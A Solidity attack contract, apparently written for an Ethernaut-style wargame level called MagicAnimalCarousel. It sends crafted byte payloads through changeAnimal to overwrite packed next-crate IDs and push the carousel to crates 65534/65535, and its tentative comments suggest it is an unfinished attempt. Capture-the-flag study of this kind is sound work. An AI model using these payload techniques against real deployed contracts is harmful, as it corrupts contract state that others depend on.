// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../levels/MagicAnimalCarousel.sol";

contract CarouselExploit3 {
    MagicAnimalCarousel public target;
    
    constructor(address _target) {
        target = MagicAnimalCarousel(_target);
    }
    
    function exploit() external {
        // Maybe we need to set the next crate ID to MAX_CAPACITY (65535)
        // Then when it adds 1 and takes modulo, it wraps to 0
        
        // Get current crate
        uint256 current = target.currentCrateId();
        
        // Set animal to move to next crate
        target.setAnimalAndSpin("x");
        
        // Now change the animal to set next ID to 65535
        bytes memory payload = new bytes(12);
        payload[0] = bytes1(uint8(255)); // 0xFF
        payload[1] = bytes1(uint8(255)); // 0xFF (65535 in total)
        
        target.changeAnimal(string(payload), target.currentCrateId());
        
        // Now spin again - should go to crate 65535
        target.setAnimalAndSpin("y");
        
        // Check where we are
        uint256 newCrate = target.currentCrateId();
        
        if (newCrate == 65535) {
            // We're at the max crate!
            // Now set its next to 0 to complete the cycle
            bytes memory zeroPayload = hex"000000000000000000000000";
            target.changeAnimal(string(zeroPayload), 65535);
            
            // Spin once more to go back to 0
            target.setAnimalAndSpin("z");
        }
    }
    
    function directExploit() external {
        // After analyzing more, I think the goal might be to make currentCrateId = 0xFFFF
        // Let's try to get there directly
        
        // First, let's see where we are
        uint256 current = target.currentCrateId();
        
        // We need to manipulate the next crate IDs to eventually reach 0xFFFF
        // Let's create a chain that leads there
        
        // If current is small, we can create a jump
        if (current < 10) {
            // Set animal
            target.setAnimalAndSpin("jump");
            
            // Now change to make next = 0xFFFF - 1 = 65534
            bytes memory jumpPayload = new bytes(12);
            jumpPayload[0] = bytes1(uint8(255)); // 0xFF  
            jumpPayload[1] = bytes1(uint8(254)); // 0xFE (65534)
            
            target.changeAnimal(string(jumpPayload), target.currentCrateId());
            
            // Spin to get to 65534
            target.setAnimalAndSpin("almost");
            
            // Set next of 65534 to 65535
            bytes memory finalPayload = new bytes(12);
            finalPayload[0] = bytes1(uint8(255)); // 0xFF
            finalPayload[1] = bytes1(uint8(255)); // 0xFF (65535)
            
            target.changeAnimal(string(finalPayload), target.currentCrateId());
            
            // Spin to reach 65535
            target.setAnimalAndSpin("there");
        }
    }
    
    function makeMaxCapacityLoop() external {
        // Different approach: maybe we need currentCrateId to BE 65535
        // and then when we spin, (65535 + 1) % 65535 = 1
        // This might break some assumption
        
        uint256 current = target.currentCrateId();
        
        // We need to navigate to crate 65534 first
        // For now, let's create a shortcut from current position
        
        // Move one step
        target.setAnimalAndSpin("a");
        
        // Set next to 65534
        bytes memory p1 = new bytes(12);
        p1[0] = bytes1(uint8(255));
        p1[1] = bytes1(uint8(254)); 
        target.changeAnimal(string(p1), target.currentCrateId());
        
        // Go to 65534
        target.setAnimalAndSpin("b");
        
        // Now we're at 65534, set next to 65535
        bytes memory p2 = new bytes(12);
        p2[0] = bytes1(uint8(255));
        p2[1] = bytes1(uint8(255));
        target.changeAnimal(string(p2), 65534);
        
        // Go to 65535
        target.setAnimalAndSpin("c");
        
        // Now at 65535, when we set animal, next will be (65535+1)%65535 = 1
        // But wait, the contract already handles this in setAnimalAndSpin
        // Let me check what happens
    }
}